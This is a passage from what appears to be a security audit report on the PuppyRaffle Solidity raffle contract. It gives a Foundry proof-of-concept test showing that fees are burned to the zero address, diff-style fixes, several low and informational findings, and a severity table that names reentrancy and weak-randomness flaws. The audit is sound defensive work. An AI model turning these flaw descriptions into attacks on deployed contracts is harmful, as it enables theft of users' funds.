If `feeAddress` is set to `address(0)` — either accidentally or via a compromised owner key — all calls to `withdrawFees()` will send ETH to the zero address, burning it permanently.

#### Impact

All accumulated protocol fees are permanently destroyed. There is no recovery path once ETH is sent to `address(0)`.

#### Proof of Concept

```solidity
// Add to PuppyRaffleTest.t.sol
function test_zeroFeeAddressDestroysFees() public {
    // Owner sets feeAddress to zero
    vm.prank(puppyRaffle.owner());
    puppyRaffle.changeFeeAddress(address(0));

    // Players enter and winner is selected
    address[] memory players = new address[](4);
    players[0] = playerOne; players[1] = playerTwo;
    players[2] = playerThree; players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    vm.warp(block.timestamp + duration + 1);
    puppyRaffle.selectWinner();

    uint256 feesBeforeWithdraw = puppyRaffle.totalFees();
    puppyRaffle.withdrawFees();
    // Fees are gone — sent to address(0)
    assertEq(address(0).balance, feesBeforeWithdraw);
}
```

#### Recommended Mitigation

Add a zero-address guard in both the constructor and `changeFeeAddress()`:

```diff
constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
+   require(_feeAddress != address(0), "PuppyRaffle: Fee address cannot be zero");
    feeAddress = _feeAddress;
    ...
}

function changeFeeAddress(address newFeeAddress) external onlyOwner {
+   require(newFeeAddress != address(0), "PuppyRaffle: Fee address cannot be zero");
    feeAddress = newFeeAddress;
    emit FeeAddressChanged(newFeeAddress);
}
```

---

## Low Severity

---

### [L-1] `getActivePlayerIndex()` returns 0 for both non-existent players and the player at index 0

**Severity:** Low  
**Likelihood:** Medium  
**Impact:** Low  

#### Description

`getActivePlayerIndex()` returns `0` when a player is not found in the array:

```solidity
// src/PuppyRaffle.sol#L110-L117
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0; // ambiguous — same as valid index 0
}
```

A player legitimately sitting at index `0` and a player not in the raffle at all are indistinguishable from the return value alone. A player who mistakenly believes they are not in the raffle (because they see `0`) might try to re-enter, or worse, another player could use `0` as their `playerIndex` in `refund()` and accidentally refund the first player.

#### Impact

Off-by-one confusion can lead to wrong UI behaviour, incorrect assumptions by callers, and edge-case bugs in integrations or front-end tooling built on top of this function.

#### Recommended Mitigation

Use a sentinel value that cannot be a valid index, or revert on not-found:

```diff
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
-   return 0;
+   revert("PuppyRaffle: Player not found");
}
```

---

### [L-2] `block.timestamp` used for raffle duration check is manipulable by validators

**Severity:** Low  
**Likelihood:** Low  
**Impact:** Low  

#### Description

The raffle end condition relies on `block.timestamp`:

```solidity
// src/PuppyRaffle.sol#L126
require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

On Ethereum, validators can manipulate `block.timestamp` by up to approximately 12 seconds (one slot). This is generally low risk for long-duration raffles (hours/days) but means a validator could end the raffle slightly early or delay it slightly.

#### Impact

Minor timing manipulation of raffle end time. In combination with the weak PRNG vulnerability ([H-2](#h-2-weak-prng-in-selectwinner-allows-miners-and-attackers-to-manipulate-the-winner)), this amplifies the attacker's window for winner manipulation.

#### Recommended Mitigation

For short-duration raffles, consider using block numbers instead of timestamps:

```diff
- require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
+ require(block.number >= raffleStartBlock + raffleDurationInBlocks, "PuppyRaffle: Raffle not over");
```

For long-duration raffles (>1 hour), the timestamp manipulation risk is negligible and may be acceptable.

---

## Informational

---

### [I-1] Dead code: `_isActivePlayer()` is defined but never called

```solidity
// src/PuppyRaffle.sol#L173-L180
function _isActivePlayer() internal view returns (bool) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == msg.sender) {
            return true;
        }
    }
    return false;
}
```

This function is never called anywhere in the contract. It increases deployment gas cost and adds unnecessary code surface. Remove it.

---

### [I-2] State variables should be declared `constant` or `immutable`

The following variables never change after deployment and should be marked accordingly to save gas:

```solidity
// Should be constant (value known at compile time)
string private commonImageUri = "ipfs://...";   // PuppyRaffle.sol#L38
string private rareImageUri = "ipfs://...";      // PuppyRaffle.sol#L43
string private legendaryImageUri = "ipfs://..."; // PuppyRaffle.sol#L48

// Should be immutable (set once in constructor)
uint256 public raffleDuration;                   // PuppyRaffle.sol#L24
```

**Fix:**

```diff
- string private commonImageUri = "ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8";
+ string private constant commonImageUri = "ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8";

- uint256 public raffleDuration;
+ uint256 public immutable raffleDuration;
```

---

### [I-3] Outdated Solidity version `^0.7.6` contains known compiler bugs

Solidity `0.7.6` is missing:
- **Automatic overflow/underflow protection** (added in `0.8.0`) — which directly enables H-3
- Numerous compiler-level bug fixes

Known bugs in `^0.7.6` include: `FullInlinerNonExpressionSplitArgumentEvaluationOrder`, `AbiReencodingHeadOverflowWithStaticArrayCleanup`, `KeccakCaching`, and others listed in the Solidity bug disclosure.

**Recommendation:** Upgrade to `^0.8.19` or later. This also eliminates the need for explicit `SafeMath` usage and provides cleaner, safer defaults.

---

### [I-4] Loop conditions read `.length` from storage on every iteration, wasting gas

```solidity
// src/PuppyRaffle.sol#L87, 111, 174
for (uint256 j = i + 1; j < players.length; j++) { ... }
for (uint256 i = 0; i < players.length; i++) { ... }
```

Reading `players.length` from storage (`SLOAD`) on every loop iteration costs 100 gas per read. Cache it in a local variable before the loop:

```diff
+ uint256 playersLength = players.length;
- for (uint256 i = 0; i < players.length; i++) {
+ for (uint256 i = 0; i < playersLength; i++) {
```

---

## Final Risk Summary

| Severity | Count | Issues |
|----------|-------|--------|
| High | 3 | Reentrancy drain, Weak PRNG, uint64 overflow |
| Medium | 3 | Fee lockout via selfdestruct, O(n²) DoS, Zero-address fee loss |
| Low | 2 | Ambiguous index return, Timestamp manipulation |
| Informational | 4 | Dead code, Non-constant vars, Old Solidity, Gas loops |
| **Total** | **12** | |

---

*End of Report*
